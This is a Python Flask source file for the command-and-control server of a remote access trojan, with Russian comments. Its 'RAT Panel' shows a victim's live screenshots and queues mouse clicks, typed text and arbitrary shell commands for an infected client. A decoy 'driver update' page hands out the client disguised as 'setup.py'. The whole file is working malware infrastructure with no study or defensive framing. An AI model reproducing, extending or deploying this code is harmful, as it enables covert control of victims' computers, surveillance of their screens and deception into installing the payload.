from flask import Flask, render_template_string, request, send_file
import os
import base64

app = Flask(__name__)

# Тут храним скриншот
latest_screenshot = 'screen.jpg'
# Очередь команд для клиента
commands = []

HTML_ADMIN = """
<!DOCTYPE html>
<html>
<head><title>RAT Panel</title></head>
<body style="background:#111; color:white; text-align:center; font-family:Arial;">
    <h1>Панель управления</h1>
    <div style="position:relative; display:inline-block;">
        <!-- Картинка, по которой мы будем кликать -->
        <img id="screen" src="/get_screen" style="width:80%; border:2px solid red; cursor:crosshair;" onclick="sendClick(event)">
    </div>
    <br><br>
    <input type="text" id="cmd" placeholder="Команда или текст..." style="padding:10px; width:300px;">
    <button onclick="sendKey()" style="padding:10px;">Отправить</button>
    <button onclick="sendCmd()" style="padding:10px; background:orange;">Выполнить в CMD</button>
    
    <script>
        function refreshImg() {
            document.getElementById('screen').src = "/get_screen?t=" + new Date().getTime();
        }
        setInterval(refreshImg, 2000); // Обновляем экран каждые 2 сек

        function sendClick(e) {
            var img = document.getElementById('screen');
            var rect = img.getBoundingClientRect();
            // Вычисляем координаты клика в процентах от размера окна
            var x = (e.clientX - rect.left) / rect.width;
            var y = (e.clientY - rect.top) / rect.height;
            
            fetch('/click', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({x: x, y: y})
            });
        }

        function sendKey() {
            var text = document.getElementById('cmd').value;
            fetch('/type', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: text})
            });
            document.getElementById('cmd').value = '';
        }
        
        function sendCmd() {
            var text = document.getElementById('cmd').value;
            fetch('/run_cmd', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cmd: text})
            });
        }
    </script>
</body>
</html>
"""

HTML_VICTIM = """
<!DOCTYPE html>
<html>
<head><title>Обновление драйверов</title></head>
<body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
    <h1>Скачайте установщик</h1>
    <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать</a>
</body>
</html>
"""

@app.route('/')
def index():
    if request.args.get('admin') == 'true':
        return render_template_string(HTML_ADMIN)
    return render_template_string(HTML_VICTIM)

@app.route('/get_screen')
def get_screen():
    try:
        return send_file(latest_screenshot, mimetype='image/jpeg')
    except:
        return "Нет данных"

@app.route('/upload_screen', methods=['POST'])
def upload_screen():
    global latest_screenshot
    file = request.files['file']
    file.save(latest_screenshot)
    return "OK"

@app.route('/get_commands', methods=['GET'])
def get_commands():
    global commands
    if commands:
        cmd = commands.pop(0)
        return cmd
    return "NONE"

@app.route('/click', methods=['POST'])
def click():
    data = request.json
    commands.append(f"CLICK|{data['x']}|{data['y']}")
    return "OK"

@app.route('/type', methods=['POST'])
def type_text():
    data = request.json
    commands.append(f"TYPE|{data['text']}")
    return "OK"

@app.route('/run_cmd', methods=['POST'])
def run_cmd():
    data = request.json
    commands.append(f"CMD|{data['cmd']}")
    return "OK"

@app.route('/download')
def download():
    return send_file('client.py', as_attachment=True, download_name='setup.py')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
